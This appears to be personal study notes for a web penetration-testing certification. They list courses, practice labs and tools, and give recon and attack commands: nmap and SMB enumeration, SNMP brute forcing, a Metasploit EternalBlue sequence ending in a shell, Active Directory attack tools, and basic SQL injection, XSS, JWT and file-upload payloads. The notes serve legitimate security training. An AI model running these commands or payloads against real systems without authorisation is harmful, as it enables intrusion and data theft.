# Resources:

https://www.udemy.com/course/learn-bug-bounty-hunting-web-security-testing-from-scratch (1 month)

https://www.reddit.com/r/hackthebox/comments/1u2mrwh/cwes_preparation/

PortSwigger Web Security Academy (2 months)

OWASP Juice Shop (2 months)

CWES (1 month)

Report tools (for CWES exam): https://github.com/Syslifters/HackTheBox-Reporting

# Labs

https://orange-cyberdefense.github.io/GOAD/labs/MINILAB/

https://hackthebox.com

https://tryhackme.com

# Cheat sheets:

https://github.com/Touexe/CBBH-CWES

https://github.com/Burdy98/Pentest-Methodology/blob/main/CWES-Methodology.md

# Tools/Others:

http://portswigger.net/: collection of all vulnerable websites, we can choose and practice on these websites safely & legally

## Reconnaissance & Enumeration tools

### Infrastructure & Network

nmap

https://github.com/bee-san/RustScan

### Web Surface

https://github.com/OJ/gobuster

https://github.com/epi052/feroxbuster

https://github.com/maurosoria/dirsearch

### list of common vulnerability

https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/common.txt

### Vulnerability Scanning

https://github.com/projectdiscovery/nuclei

https://github.com/aquasecurity/trivy

https://github.com/aquasecurity/kube-hunter

### Exploitation & Deep Testing

https://portswigger.net/burp

https://github.com/zaproxy/zaproxy

https://github.com/ffuf/ffuf

https://github.com/xmendez/wfuzz

### Common flow:

nmap/rustscan -> find out port 80/433 -> use feroxbuster -> find out path /api/v1/user -> use Burp suite -> analyze api request -> use ffuf -> brute-force ID parameter -> find out IDOR (Insecure Direct Object Reference) or use Nuclei -> scan API CVE

### Attack Techniques:

## Attach Network Service

### Banner Grabbing

Auto scan 1,000 ports:
nmap -sV --script=banner [IP]

we can also attempt this manually using netcat (nc cmd):
nc -nv [ip] [port]

### FTP
ftp -p [IP] : connect FTP (input 'anonymous' if prompt ask to check)

collect priviledges: 

get login.txt
or
get password.txt

### SMB

nmap --script smb-os-discovery.nse -p445 [IP]

nmap -A -p445 [IP]

### Shares

smbclient -N -L \\\\[IP] : retrieve a list of available shares on the IP (-L), while -N suppresses the password prompt

smbclient \\\\[IP]\\users : connect SMB server with guest user

smb: \> ls

smb: \> cd flag

smb: \flag\> get flag.txt

smb: \> exit

cat flag.txt

try to connect with specific username  (ex:bob in bob:Weblcome1)
smbclient -U [username] //[IP]/users

### SNMP (port 161 UDP)
In SNMP, we have 2 strings public and private. Private string allows to read/write system info of device

snmpwalk -v 2c -c public [IP] [private string - OID - Object Identifier. ex: 1.3.6.1.2.1.1.5.0]

snmpwalk -v 2c -c private  10.129.42.253 

onesixtyone -c dict.txt [IP] : Brute force tool

# Web Enumeration

gobuster dir -u [URL/IP] -w common.txt

common.txt download from this link: https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/common.txt

gobuster dns -u [URL/IP] -w common.txt : find out subdomains

Tips:
  curl -IL [URL/IP]: read header, get web server info (apache, nginx,version,os...)
  
  whatweb [IP]: get tech stacks of website (wordpress, php, version, jquery...)

  whatweb --no-errors [CIRD]: get all tech stacks of IP ranges, no return error if specific IP doesn't exist.
  
  SSL/TLS certs
  
  robots.txt: get sensitive paths
  
  read source code website (ctrl + u)

# Public Exploits

install searchsploit: sudo apt isntall -y exploitdb

searchsploit openssh 7.2 : search for a specific application by its name

MEtrasploit Primer : Metasploit Framework (MSF): pentest tool

### Public Exploits

After finding out a tech stacks and services, version running on server, the next step is that check in search engine (google,bing...) whether having an vulnerability declared or not with keyword "[app/service name] [version] exploit"

Or we can use an special tools name Searchsploit: 
```
$ sudo apt install -y exploitdb
```

then search by using cmd: 
```
$ searchsploit [app/service name] [version]
```

Or checkout on online DB: https://www.exploit-db.com/ and https://www.rapid7.com/db/

Metasploit Framework (MSF)

MSF is a powerful framework, which allows to exploit testing, integrate robust features and tools such as run script to collect info, check target server has vulnerability or not,.... It can run on Windows, Linux, MacOS

```
// startup 
$ msfconsole

// search exploit
$ search exploit eternalblue

// choose module 0
$ use 0

// choose module
$ use exploit/windows/smb/ms17_010_psexec (or specific path)

// show options
$ show options

// set target IP
set RHOSTS [target IP]

// set target port
set RPORT 30570

// set attack IP
set LHOST tun0

// check exploit
$ check

// take control
$ exploit
// or
$ run

// enter cli
$ shell
```

### Attack Active Directory & Internal network

NetExec / CrackMapExec: password spraying, list share SMB, check admin privilenge, execute remotely cmd

Impacket: get sensitive data

BloodHound & SharpHound: collewct AD data and draw map, find out a chain of complex atatck

Responder: Poisoning LLMNR/NBT-NS, collect NTLMv2

Rubeus & Minikatz: 

### Privillege Escalation

WinPEAS / LinPEAS

### Pivoting & Tunneling

Ligolo-ng

Chisel


### SQL Injections:

'

"

--

`#

UNION SELECT NULL--

### tools:

https://github.com/sqlmapproject/sqlmap

### XSS
```
<script>alert(1)</script>

<img src=x onerror=alert(1)>

# tools:

https://github.com/webhooksite/webhook.site

XSS Hunder

```
### SSRF

payload http://127.0.0.1 -> server returns its public ip in cloud

### JWT

alg:none

Weak secret

Session Cookie

Trust Client Claims

### File Upload

shell.php.jpg

.phtml

.phar

### Access Control

IDOR:

ID=1 -> ID=2 -> ID=3

Vertical Privilege Escalation

User -> Admin

Horizontal Privilege Escalation

User1 -> User2

### Authentication

Brute Force

Password Spraying

MFA Bypass

Session Fixation

### Business Logic

Coupon discount $50 -> discount more $50 -> loop 

# Tools

Proxy

Repeater

Decoder (JWT, Base64)

Intruder

Logger

# Mock exam

Build on your self

### DVWA (Damn Vulnerable Web Application): create a bugging web application for pentest
```
docker run --rm -it \
-p 4280:80 \
vulnerables/web-dvwa
```

### bWAPP (Buggy Web Application): create a bug web application, more than DVWA
```
docker run -d \
-p 8080:80 \
raesene/bwapp
```

### Juice shop (OWASP Juice Shop, a bugging e-commerce website, same as real life)
```
docker run -d \
-p 3000:3000 \
bkimminich/juice-shop
```

### PortSwigger: Hacking labs

### target: Gaining system control for 2 hours

### Others

SysReport

Obsidian / Notion

### tmux: 
Ctrl + B is a prefix command default of tmux

Ctrl + B, then C : open a new windows

Ctrl + B, then 0 or 1 : switch to windows

Ctrl + B, then [Shift + %] : split a windows vertically into panes

Ctrl + B, then [Shift + "] : split a windows horizontally into panes

use up down arrow to switch horizontal windows, and let right arrow to switch vertical windows

more info: https://tmuxcheatsheet.com/

### vim

https://vimsheet.com/

### OS

Kali linux: Industry Standard

Parrot OS (Security Edition): Recommend to use

### Metasploit Framework (MSF)

https://www.metasploit.com/

# useful commands

netcat [IP] [port][ get banner string of server

nmap -sV [IP] : scan and explore network devices, port scanning. By default, it will scan 1.000 ports. -sV params used to know what app, version, OS running

nmap -sC [IP] : run with default scripts to collect detail infos (website header, file sharing config...)

notice:

locate scripts/citrix : get all list of default script

nmap --script [script name] -p[port] [host/ip] : run with specific script


nmap -sCV [IP] : combine 2 above cmds

nmap -sCV -p- [IP] : scan all 65,535 TCP ports

nmap -sV -p [port] [IP] -Pn



